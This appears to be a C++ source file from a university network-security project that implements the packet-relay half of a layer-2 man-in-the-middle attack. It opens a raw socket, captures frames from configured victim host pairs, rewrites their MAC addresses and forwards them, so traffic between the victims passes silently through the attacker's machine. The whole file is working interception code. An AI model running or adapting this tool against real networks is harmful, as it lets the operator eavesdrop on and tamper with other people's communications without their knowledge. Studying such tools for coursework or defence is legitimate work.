// Projekt: PDS - L2 MitM
// Autor:   Daniel Klimaj; xklima22@stud.fit.vutbr.cz

#include <csignal>
#include <libxml/xmlreader.h>
#include <libxml/parser.h>
#include <libxml/tree.h>

#include "types.h"
#include "hash.h"
#include "netitf.h"
#include "arppkt.h"
#include "socket.h"
#include "icmpv6pkt.h"
#include "hostgroup.h"

using namespace std;

///
/// \brief Priznak urcujuci, ci sa bude este pokracovat v zachytavani paketov,
/// SIGINT ho nastavi na false
///
bool do_intercept = true;

void print_usage();
void on_sigint(int signum);
bool get_groups(std::string fname, HostGroups *hgs);
void parse_elements(xmlNode * node, vector<StrVect *> *sv);
HostGroups create_groups(vector<StrVect *> *v);
bool contains(vector<uint> vu, uint v);
bool intercept(NetItf *itf, HostGroups *hgs);

const uint FIRST  = 1;
const uint SECOND = 2;
const uint BLEN   = 65000;

int main(int argc, char **argv)
{
    int opt;
    string fname     = "";
    string interface = "";
    bool opts_ok     = true;
    bool all_ok      = true;

    while ((opt = getopt(argc, argv, "i:f:")) != -1)
    {
        switch (opt)
        {
            case 'i':
                interface = string(optarg);
                break;
            case 'f':
                fname = string(optarg);
                break;
            default:
                opts_ok = false;
                break;
        }
    }

    if(interface.empty() || fname.empty() || !opts_ok)
    {
        print_usage();
        return OP_FAIL;
    }

    signal(SIGINT, on_sigint);

    NetItf *itf = new NetItf(interface);
    if(itf->index() < OP_SUCC)
    {
        cerr << "Failed to find netinterface '" << interface  << "'" << endl;
        all_ok = false;
    }

    HostGroups hgs;
    all_ok = get_groups(fname, &hgs);

    for(uint i=0; i<hgs.size(); ++i)
        hgs[i]->print();

    if(all_ok)
    {
        if(!intercept(itf, &hgs))
        {
            cerr << "Intercept failed" << endl;
            all_ok = false;
        }
    }

    return all_ok ? OP_SUCC : OP_FAIL;
}

///
/// \brief Vypise pouzitie programu
///
void print_usage()
{
    cout << "Usage: pds-intercept -i interface -f hosts_xml" << endl;
}

///
/// \brief SIGINT handler
/// \param signum
///
void on_sigint(int signum)
{
    cout << " SIGINT(" << signum << ") detected" << endl;
    do_intercept = false;
}

///
/// \brief Ziska skupiny zo zadaneho XML. Ciastocne prebrane z
/// http://www.xmlsoft.org/examples/tree1.c
/// \param fname cesta ku XML suboru
/// \param hg skupiny
/// \return false pri chybe
///
bool get_groups(std::string fname, HostGroups *hgs)
{
    (void) hgs;

    xmlDoc *doc           = nullptr;
    xmlNode *root_element = nullptr;

    vector<StrVect *> v;

    doc = xmlReadFile(fname.c_str(), nullptr, 0);

    if (doc == nullptr)
    {
        cerr << "Failed to open XML file" << endl;
        return false;
    }

    root_element = xmlDocGetRootElement(doc);
    parse_elements(root_element, &v);

    *hgs = create_groups(&v);

    xmlFreeDoc(doc);
    xmlCleanupParser();

    return true;
}

void parse_elements(xmlNode * node, vector<StrVect *> *sv)
{
    xmlNode *cur_node = nullptr;
    xmlAttrPtr attr;
    xmlChar *attr_v;
    string nname = "";
    bool to_add  = true;


    for (cur_node = node; cur_node; cur_node = cur_node->next)
    {
        if (cur_node->type == XML_ELEMENT_NODE)
        {
            nname = string((char*)cur_node->name);
            if(nname == "host")
            {
                to_add = false;
                for(attr=cur_node->properties; attr!=nullptr; attr=attr->next)
                {
                    if(string((char*)attr->name) == "group")
                    {
                        to_add = true;
                    }
                }
                if(to_add)
                {
                    sv->push_back(new StrVect());
                    for(attr=cur_node->properties; attr!=nullptr; attr=attr->next)
                    {
                        attr_v = xmlGetProp(cur_node, attr->name);
                        sv->at(sv->size()-1)->push_back(string(string(
                            (char*)attr->name)) + "@" + string((char*)attr_v));
                    }
                }
            }
            else if(nname == "ipv4")
            {
                sv->at(sv->size()-1)->push_back(string("ipv4@" +
                    string((char*)cur_node->children->content)));
            }
            else if(nname == "ipv6")
            {
                sv->at(sv->size()-1)->push_back(string("ipv6@" +
                    string((char*)cur_node->children->content)));
            }
        }

        if(to_add)
            parse_elements(cur_node->children, sv);
    }
}

HostGroups create_groups(vector<StrVect *> *v)
{
    HostGroups hgs;
    vector<uint> processed;
    string gr1 = "";
    string gr2 = "";

    for(uint i=0; i<v->size(); ++i)
    {
        if(contains(processed, i))
            continue;
        for(string c : *(v->at(i)))
        {
            if(c.substr(0, 5) == "group")
            {
                gr1 = c;
                break;
            }
        }
        for(uint j=i+1; j<v->size(); ++j)
        {
            if(contains(processed, j))
                continue;
            for(string c : *(v->at(j)))
            {
                if(c.substr(0, 5) == "group")
                {
                    gr2 = c;
                    break;
                }
            }
            if(!gr1.empty() && gr1 == gr2 && v->at(i)->size() == v->at(j)->size())
            {
                processed.push_back(i);
                processed.push_back(j);
                gr1 = "";
                gr2 = "";

                HostGroup *tmp = new HostGroup(*(v->at(i)), *(v->at(j)));
                hgs.push_back(tmp);
            }
        }
    }
    return hgs;
}

bool contains(vector<uint> vu, uint v)
{
    for(uint x : vu)
    {
        if(x == v)
            return true;
    }
    return false;
}

bool intercept(NetItf *itf, HostGroups *hgs)
{
    Socket s(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if(s.open() != SocketStatus::Opened)
    {
        cerr << "Failed to open socket" << endl;
        return false;
    }
    s.setopt(SOL_SOCKET, SO_BINDTODEVICE, itf->name(), itf->name().size());

    MACAddr  *loc_mac = itf->mac();
    uchar     buff[BLEN];
    uint16_t  tmp16;
    uchar     tmp8[2];
    int       rcvd;
    bool      for_me = true;
    MACAddr  *mac_src = nullptr;
    IPv4Addr *ip4_src = nullptr;
    IPv4Addr *ip4_dst = nullptr;
    IPv6Addr *ip6_src = nullptr;
    IPv6Addr *ip6_dst = nullptr;
    UchrVect mac_src_o;
    UchrVect ip_src_b;
    UchrVect ip_dst_b;
    IPVer    ipv;
    uint     member = 0; // Urcuje, ktory clen z paru je odosielatel

    // Len na zostavenie sockaddr_ll, IP adresy su nepodstatne
    ArpPkt *arp     =
        new ArpPkt(ArpType::Request, new IPv4Addr("127.0.0.1"), loc_mac);
    IcmpV6Pkt *icmp =
        new IcmpV6Pkt(IcmpV6Type::Ping, new IPv6Addr("FF02::1"), loc_mac);

    while(do_intercept)
    {
        for_me = true;
        rcvd = s.recv_from(buff, BLEN, 0);
        if(rcvd < 0)
        {
            cerr << "Failed to receive packet" << endl;
            break;
        }
        for(uint i=0; i<MACAddr::OCTETS; ++i)
        {
            if(buff[i] != loc_mac->octet(i))
            {
                for_me = false;
                break;
            }
        }

        if(!for_me) // Ignoruj vsetko okrem unicastu
            continue;

        tmp8[0] = buff[12];
        tmp8[1] = buff[13];
        memcpy(&tmp16, tmp8, S_USHORT);
        tmp16 = ntohs(tmp16);

        if(tmp16 == ETH_P_IP)
            ipv = IPVer::IPv4;
        else if(tmp16 == ETH_P_IPV6)
            ipv = IPVer::IPv6;
        else
            continue;

        // ! Odtialto nepouzivat continue !
        for(uint i=0; i<MACAddr::OCTETS; ++i)
            mac_src_o.push_back(buff[i+6]); // Src MAC v Ethernet hlavicke
        mac_src = new MACAddr(mac_src_o);

        for(uint i=0; i<hgs->size(); ++i)
        {
            HostGroup *hg = hgs->at(i);
            if(hg->mac1()->eq(mac_src))
                member = FIRST;
            else if(hg->mac2()->eq(mac_src))
                member = SECOND;
            else
                member = 0;

            if(member > 0)
            {
                if(ipv == IPVer::IPv4)
                    cout << "Intercepted IPv4 packet" << endl;
                else
                    cout << "Intercepted IPv6 packet" << endl;

                bool match_ip = false;
                if(ipv == IPVer::IPv4) // Kontrola parov IPv4 adries
                {
                    for(uint i=0; i<IPv4Addr::OCTETS; ++i)
                    {
                        ip_src_b.push_back(buff[i+26]); // Src IPa v IPv4 hlavicke
                        ip_dst_b.push_back(buff[i+30]); // Dst IPa v IPv4 hlavicke
                    }
                    ip4_src = IPv4Addr::from_bytes(ip_src_b);
                    ip4_dst = IPv4Addr::from_bytes(ip_dst_b);

                    if(member == FIRST)
                    {
                        if(ip4_src->eq(hg->ipv4_1()))
                            match_ip = true;
                    }
                    else if(member == SECOND)
                    {
                        if(ip4_src->eq(hg->ipv4_2()))
                            match_ip = true;
                    }
                }
                else if(ipv == IPVer::IPv6) // Kontrola parov IPv6 adries
                {
                    for(uint i=0; i<IPv6Addr::BYTES; ++i)
                    {
                        ip_src_b.push_back(buff[i+22]); // Src IPa v IPv6 hlavicke
                        ip_dst_b.push_back(buff[i+38]); // Dst IPa v IPv6 hlavicke
                    }
                    ip6_src = IPv6Addr::from_bytes(ip_src_b);
                    ip6_dst = IPv6Addr::from_bytes(ip_dst_b);

                    if(member == FIRST)
                    {
                        for(uint i=0; i<hg->len_ipv6s_1(); ++i)
                        {
                            if(ip6_src->eq(hg->ipv6_1(i)))
                            {
                                match_ip = true;
                                break;
                            }
                        }
                    }
                    else if(member == SECOND)
                    {
                        for(uint i=0; i<hg->len_ipv6s_2(); ++i)
                        {
                            if(ip6_src->eq(hg->ipv6_2(i)))
                            {
                                match_ip = true;
                                break;
                            }
                        }
                    }
                }

                if(match_ip) // IP adresy su v zadanych paroch
                {
                    MACAddr *tmp_mac = nullptr;
                    if(member == FIRST)
                        tmp_mac = hg->mac2();
                    else
                        tmp_mac = hg->mac1();

                    for(uint i=0; i<MACAddr::OCTETS; ++i)
                    {
                        buff[i+MACAddr::OCTETS] = loc_mac->octet(i);
                        buff[i] = tmp_mac->octet(i);
                    }

                    // Preposli spravu povodnemu adresatovi
                    if(ipv == IPVer::IPv4)
                    {
                        cout << "From: " << ip4_src->addr() << " to " <<
                            ip4_dst->addr() << endl;
                        sockaddr_ll sa4 = arp->sock_addr(itf->index());
                        s.send(buff, rcvd, 0, (sockaddr *)&sa4, sizeof(sa4));
                    }
                    else if(ipv == IPVer::IPv6)
                    {
                        cout << "From: " << ip6_src->addr() << " to " <<
                            ip6_dst->addr() << endl;
                        sockaddr_ll sa6 = icmp->sock_addr(itf->index());
                        s.send(buff, rcvd, 0, (sockaddr *)&sa6, sizeof(sa6));
                    }
                }
            }
        }

        if(ip4_src != nullptr) delete ip4_src;
        if(ip4_dst != nullptr) delete ip4_dst;
        if(ip6_src != nullptr) delete ip6_src;
        if(ip6_dst != nullptr) delete ip6_dst;
        delete mac_src;
        mac_src = nullptr;
        ip4_src = nullptr;
        ip4_dst = nullptr;
        ip6_src = nullptr;
        ip6_dst = nullptr;
        mac_src_o.clear();
        ip_dst_b.clear();
        ip_src_b.clear();
    }

    s.close();
    return true;
}
